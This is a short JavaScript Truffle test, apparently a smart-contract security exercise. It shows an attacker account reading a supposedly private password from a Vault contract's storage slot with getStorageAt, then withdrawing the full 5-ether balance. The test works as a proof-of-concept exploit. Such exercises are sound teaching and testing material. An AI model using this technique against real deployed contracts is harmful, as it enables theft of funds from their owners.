const Vault = artifacts.require('Vault.sol');

contract('Vault', async (accounts) => {
  let vault;
  let deployer = accounts[0];
  let attacker = accounts[1];

  beforeEach(async () => {
    vault = await Vault.new(web3.utils.asciiToHex("zabi"));

    await vault.deposit({ from: deployer, value: web3.utils.toWei('5') });
  });

  it("should be possible to access private variable", async () => {
    const initialContractBalance = await web3.eth.getBalance(vault.address);
    const initialAttackerBalance = await web3.eth.getBalance(attacker);

    console.log('Initial Contract Balance', web3.utils.fromWei(initialContractBalance));
    console.log('Initial Attacker Balance', web3.utils.fromWei(initialAttackerBalance));

    let password = await web3.eth.getStorageAt(vault.address, 1);

    console.log(web3.utils.hexToAscii(password));
    console.log(password);

    await vault.withdraw(password, { from: attacker});

    const finalContractBalance = await web3.eth.getBalance(vault.address);
    const finalAttackerBalance = await web3.eth.getBalance(attacker);

    console.log('Final Contract Balance', web3.utils.fromWei(finalContractBalance));
    console.log('Final Attacker Balance', web3.utils.fromWei(finalAttackerBalance));

    assert(web3.utils.fromWei(initialContractBalance) == '5', "initial amoutns");
    assert.equal(finalContractBalance, '0', "zero to contract");
  });
})